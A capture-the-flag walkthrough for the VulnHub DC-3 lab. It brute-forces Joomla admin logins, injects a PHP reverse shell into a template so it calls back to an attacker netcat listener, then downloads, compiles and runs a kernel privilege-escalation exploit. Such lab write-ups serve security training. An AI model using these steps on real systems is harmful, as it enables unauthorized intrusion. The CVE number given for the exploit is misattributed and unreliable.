# DC-3 CTF Walkthrough

> **Platform:** VulnHub — DC Series  
> **Difficulty:** Intermediate  
> **Goal:** Gain root access and read `the-flag.txt`  
> **Tools Used:** Nmap, Netdiscover, Wappalyzer, Nmap NSE Scripts, Netcat, PHP Reverse Shell, eBPF Exploit (CVE-2016-4997 / EDB-39772)

---

## Table of Contents

1. [Network Scanning & Host Discovery](#step-1-network-scanning--host-discovery)
2. [Service Enumeration](#step-2-service-enumeration)
3. [Web Application Fingerprinting](#step-3-web-application-fingerprinting)
4. [Joomla Brute Force (Credential Discovery)](#step-4-joomla-brute-force-credential-discovery)
5. [Gaining Initial Access via Reverse Shell](#step-5-gaining-initial-access-via-reverse-shell)
6. [Injecting PHP Reverse Shell via Joomla Template](#step-6-injecting-php-reverse-shell-via-joomla-template)
7. [Catching the Shell & Upgrading TTY](#step-7-catching-the-shell--upgrading-tty)
8. [Privilege Escalation — eBPF Double-fdput Exploit](#step-8-privilege-escalation--ebpf-double-fdput-exploit)
9. [Root Flag](#step-9-root-flag)

---

## Step 1: Network Scanning & Host Discovery

**Tool:** Netdiscover (ARP scan)

First, we scan the local network to find all active hosts.

```bash
netdiscover
```

**Output:**

We discover **13 hosts** on the `192.168.1.0/24` network. Among them:

| IP Address     | MAC Address         | Vendor                |
|----------------|---------------------|-----------------------|
| 192.168.1.15   | 70:a8:d3:ae:84:90   | Intel Corporate       |
| 192.168.1.27   | 00:0c:29:cd:99:24   | **VMware, Inc.** ← Target |
| 192.168.1.8    | ee:49:aa:67:bf:85   | Unknown vendor        |

> **Target identified:** `192.168.1.27` (VMware machine = DC-3 VM)

---

## Step 2: Service Enumeration

**Tool:** Nmap

Run a full port scan with service version detection on the target:

```bash
nmap -sC -sV -p- 192.168.1.27
```

**Output:**

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-server-header: Apache/2.4.18 (Ubuntu)
| http-title: Home
| http-generator: Joomla! - Open Source Content Management
MAC Address: 00:0C:29:CD:99:24 (VMware)
```

> **Finding:** Only **port 80** is open. The web server is running **Joomla CMS** on Ubuntu.

---

## Step 3: Web Application Fingerprinting

**Tool:** Browser + Wappalyzer Extension

Navigate to `http://192.168.1.27` in the browser.

**DC-3 homepage message:**
> "This time, there is only one flag, one entry point and no clues. To get the flag, you'll obviously have to gain root privileges."

Using **Wappalyzer** browser extension, we confirm the tech stack:

| Category            | Technology         |
|---------------------|--------------------|
| CMS                 | Joomla             |
| Web Server          | Apache HTTP        |
| Programming Language| PHP                |
| OS                  | Ubuntu             |
| JS Libraries        | jQuery 1.12.4, jQuery Migrate 1.4.1 |
| UI Framework        | Bootstrap          |
| Editor              | CodeMirror 5.23.0  |

> **Key Finding:** Joomla CMS is confirmed. This opens up Joomla-specific attack vectors.

---

## Step 4: Joomla Brute Force (Credential Discovery)

**Tool:** Nmap NSE Script — `http-joomla-brute`

First, check if the Joomla brute force script is available:

```bash
ls /usr/share/nmap/scripts | grep "joomla"
```

Output: `http-joomla-brute.nse` ✅

Run the brute force attack:

```bash
nmap --script=http-joomla-brute.nse 192.168.1.27
```

**Output (Valid Credentials Found):**

```
http-joomla-brute:
  Accounts:
    admin:snoopy          - Valid credentials
    test:snoopy           - Valid credentials
    root:hunter           - Valid credentials
    administrator:hunter  - Valid credentials
    webadmin:hunter       - Valid credentials
    user:snoopy           - Valid credentials
    web:snoopy            - Valid credentials
    guest:snoopy          - Valid credentials
    netadmin:snoopy       - Valid credentials
    sysadmin:hunter       - Valid credentials
```

> **Use:** `admin:snoopy` to log in at `http://192.168.1.27/administrator`

---

## Step 5: Setting Up a Netcat Listener

Before injecting the reverse shell, start a **Netcat listener** on your Kali machine:

```bash
nc -lnvp 4444
```

```
listening on [any] 4444 ...
```

> Keep this terminal open. The reverse shell will connect back here.

---

## Step 6: Injecting PHP Reverse Shell via Joomla Template

**Method:** Joomla Admin Panel → Template Editor → `error.php`

1. Log in to Joomla Admin at `http://192.168.1.27/administrator` using `admin:snoopy`
2. Go to **Extensions → Templates → Templates**
3. Click on the active template (**Beez3**)
4. Open `error.php` in the editor

**Get the PHP reverse shell from GitHub:**

Navigate to: `https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php`

Copy the reverse shell code and paste it into `error.php`.

**Modify these two lines in the shell code:**

```php
$ip = '192.168.1.16';   // Your Kali machine IP
$port = 4444;            // Port matching your Netcat listener
```

5. Click **Save** in the Joomla editor.
6. Trigger the shell by visiting: `http://192.168.1.27/index.php?notexist` (causes a 404 → loads error.php)

---

## Step 7: Catching the Shell & Upgrading TTY

Back on your Netcat listener, you should see:

```
connect to [192.168.1.16] from (UNKNOWN) [192.168.1.27] 51598
Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP ...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

> We have a shell as **www-data** (low privilege user).

**Upgrade to a proper TTY shell using Python:**

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

Check OS version:

```bash
lsb_release -a
```

Output:
```
Distributor ID: Ubuntu
Description:    Ubuntu 16.04 LTS
Release:        16.04
Codename:       xenial
```

> **Ubuntu 16.04 (Xenial)** — this is vulnerable to a known kernel privilege escalation exploit!

---

## Step 8: Privilege Escalation — eBPF Double-fdput Exploit

**Exploit:** EDB-ID 39772 — Linux Kernel 4.4.x (Ubuntu 16.04) `double-fdput()` bpf(BPF_PROG_LOAD) Privilege Escalation  
**CVE:** CVE-2016-4997

**Reference:** `https://www.exploit-db.com/exploits/39772`

### Download & Extract Exploit

Navigate to `/tmp` directory on the target machine:

```bash
cd tmp
```

Download the exploit zip:

```bash
wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
```

Unzip and extract:

```bash
unzip 39772.zip
cd 39772
tar -xvf exploit.tar
cd ebpf_mapfd_doubleput_exploit
ls
# compile.sh  doubleput.c  hello.c  suidhelper.c
```

### Compile the Exploit

```bash
./compile.sh
```

You may see warnings about pointer-to-integer cast — these are safe to ignore.

```bash
ls
# compile.sh  doubleput  doubleput.c  hello  hello.c  suidhelper  suidhelper.c
```

### Run the Exploit

```bash
./doubleput
```

**Output:**

```
starting writev
woohoo, got pointer reuse
ls
ls
writev returned successfully. if this worked, you'll have a root shell in ≤60 seconds.
suid file detected, launching rootshell...
we have root privs now...
```

---

## Step 9: Root Flag

Navigate to root's home directory:

```bash
cd /root
ls
# the-flag.txt
cat the-flag.txt
```

**Flag Output:**

```
 __    __          _  _   ____                         _   _ _   _
/ / /\ \ \___  ___| || | |  _ \  ___  _ __   ___     | | | | | | |
\ \/  \/ / _ \/ __| || |_| | | |/ _ \| '_ \ / _ \    | | | | | | |
 \  /\  /  __/\__ \__   _| |_| | (_) | | | |  __/    | |_| | |_| |
  \/  \/ \___||___/  |_| |____/ \___/|_| |_|\___|     \___/ \__,_|

Congratulations are in order. :-)

I hope you've enjoyed this challenge as I enjoyed making it.
```

> **Root shell obtained! DC-3 pwned!** 🎉

---

## Summary

| Step | Action | Tool/Method |
|------|--------|-------------|
| 1 | Host Discovery | Netdiscover (ARP) |
| 2 | Port & Service Scan | Nmap `-sC -sV -p-` |
| 3 | Tech Stack Fingerprint | Wappalyzer |
| 4 | Credential Brute Force | Nmap `http-joomla-brute` NSE |
| 5 | Listener Setup | Netcat `nc -lnvp 4444` |
| 6 | RCE via Template | PHP Reverse Shell in Joomla editor |
| 7 | Shell Stabilization | Python PTY spawn |
| 8 | Privilege Escalation | EDB-39772 (CVE-2016-4997) eBPF exploit |
| 9 | Flag | `cat /root/the-flag.txt` |

---

## Key Takeaways

- **CMS enumeration** is critical — Joomla, WordPress, Drupal all have known attack vectors.
- **Weak credentials** on admin panels are a major vulnerability.
- **Template file editing** in CMS admin panels can be abused for RCE.
- **Kernel version matters** — always check OS version after initial access for local privilege escalation exploits.
- **eBPF misconfiguration** in older Ubuntu kernels allows unprivileged users to escalate to root.

---

> *This walkthrough is for educational purposes only. Always practice ethical hacking on machines you own or have explicit permission to test.*
